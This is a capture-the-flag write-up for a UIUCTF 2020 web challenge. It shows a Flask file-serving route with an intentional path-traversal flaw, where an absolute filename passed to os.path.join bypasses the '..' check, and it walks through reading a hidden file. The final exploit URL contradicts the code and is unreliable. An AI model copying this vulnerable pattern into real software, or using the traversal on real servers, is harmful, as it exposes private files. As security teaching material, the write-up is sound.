# security_question - uiuctf 2020

_Someone just asked a very interesting question online. Can you help them solve their problem?

The challenge link, `https://security.chal.uiuc.tf/`, brings us to a fake
StackOverflow page with the poster complaining that their friend was able to
access the `hidden_poem.txt` file in the root directory (`/`) on the server.

```
@app.route('/getpoem')
def get_poem():
    poemname = request.args.get('name')

    if not poemname:
        return 'Please send a name query:\n' + str(os.listdir('poems')), 404

    poemdir     = os.path.join(os.getcwd(), 'poems')
    poempath    = os.path.join(poemdir, poemname)

    if '..' in poemname:
        return 'Illegal substring detected.', 403

    if not os.path.exists(poempath):
        return 'File not found.', 404

    return send_file(poempath)
```

In this Python code we see a route defined `/getpoem` assigned to the `get_poem()` function.

```
@app.route('/getpoem')
```
We also see `poemname` being assigned as query parameter.

```
poemname = request.args.get('name')
```

If we try the endpoint `https://security.chal.uiuc.tf/getpoem?name` we get the following response:

```
Please send a name query: ['rise.txt', 'daddy.txt', 'tyger.txt', 'road.txt']
```

The Python code that causes the trouble here is in the joining of paths.

```
poemdir     = os.path.join(os.getcwd(), 'poems')
poempath    = os.path.join(poemdir, poemname)
```

In the 2nd line we see that the `poemdir` directory and `poemname` file are
being joined to created a path. If we evalute this line of code in a REPL, we
get the following:

```
>>> import os
>>> poemdir = os.path.join(os.getcwd(), 'poems')
>>> poemdir
'/home/user/poems'
```

We know that `poemdir` is the `poems` subdirectory inside the current working directory. Keep in mind that our interest is in the root `/` directory to get `hidden_poem.txt`.

```
>>> poemname = "poem.txt"
>>> poempath = os.path.join(poemdir, poemname)
>> poempath
'/home/user/poems/poem.txt'
```

Because of the way that `os.path.join()` works, if we set `poemname` to `/hidden_poem.txt`, we won't get:

```
/home/user/poems//hidden_poem.txt
```

Instead we'll just get:

```
/hidden_poem.txt
```

Which is the path we want. We can try passing this in as the query parameter:

`https://security.chal.uiuc.tf/getpoem/name?=/hiddenpoem.txt`

And we get the flag!
